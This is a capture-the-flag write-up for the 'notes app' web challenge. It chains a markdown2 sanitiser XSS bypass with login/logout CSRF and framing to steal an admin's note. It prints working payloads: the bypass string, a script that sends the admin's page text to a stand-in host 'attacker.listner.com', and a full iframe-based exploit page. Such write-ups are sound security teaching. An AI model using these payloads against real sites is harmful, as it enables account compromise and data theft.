# notes app

## Description

noob just created a secure app to write notes.

Show him how secure it really is!

https://notes.web.byteband.it/

## Solution

A service running at `https://notes.web.byteband.it/` and given source code.

Functionality is simple that, every user have only one note(sanitised by markdown2) and Admin have it too(it stores the FLAG).

Given an Admin bot which loads the admin account and then visits our URL (no domain restrictions).

Observation - 1

Markdown2 has bypass for XSS attack. The attack vectore was shown in issue on github repo of the project: https://github.com/trentm/python-markdown2/issues/341

Through that we got XSS, but no use. It's a SELF XSS :(

payload:
```
<http://g<!s://q?<!-<[<script>alert(1);/\\*](http://g)->a><http://g<!s://g.c?<!-<[a\\*/</script>aler(1);/*](http://g)->a>
```

Observation - 2

what we can do with SELF XSS (individually) , Again looked at the site and listed the issues

1) Logout CSRF (/logout)
2) Login CSRF (/login?username=xxxx&password=xxxxxx)
3) SELF XSS
4) No IFRAME Restrictions

After some trails by combining them, finally crafted an attack!

Exploitation

1) Create an Attacker account and inject the XSS payload in his profile.

```
<http://g<!s://q?<!-<[<script>window.location = 'http://attacker.listner.com/?a='+JSON.stringify(top.admin.document.body.getElementsByClassName('is-4')[0].innerText);/\*](http://g)->a><http://g<!s://g.c?<!-<[a\\*/</script>alert(1);/*](http://g)->a>
```

2) Create HTML page with exploit and publish it on the attacker server

```xml
<!DOCTYPE html>
<html>
<head>
  <script type="text/javascript">
    document.addEventListener("DOMContentLoaded", function(event) {// Ждем когда спарсится контент страницы

      setTimeout(function(){
        /* Чтобы загрузился iframe админа и логаут не произошел раньше времени */
        user.location = "https://notes.web.byteband.it/logout";

        setTimeout(function(){
          user.location = "https://notes.web.byteband.it/login?username=jack&password=1w2w3w4w"; 

        },2000);

      },2000);
      
    });

  </script>
</head>
<body>
  <!-- <img src="https://effigis.com/wp-content/uploads/2015/02/DigitalGlobe_WorldView2_50cm_8bit_Pansharpened_RGB_DRA_Rome_Italy_2009DEC10_8bits_sub_r_1.jpg"> -->
  <img src="http://deelay.me/20000/http://example.com"/> <!-- Продлим событие onload на 20 сек. Т.к. после него бот закроет страницу. -->
  <iframe name="admin" src="https://notes.web.byteband.it/profile"></iframe>
  <iframe name="user" src="https://notes.web.byteband.it/profile"></iframe>
</body>
</html>
```

Note: To make the bot to give some time for this process, Added `<img src="http://deelay.me/20000/http://example.com">` Which takes 20 sec to load the image from server.

3) Submitting the final URL to bot
Flag :
flag{ch41n_tHy_3Xploits_t0_w1n}

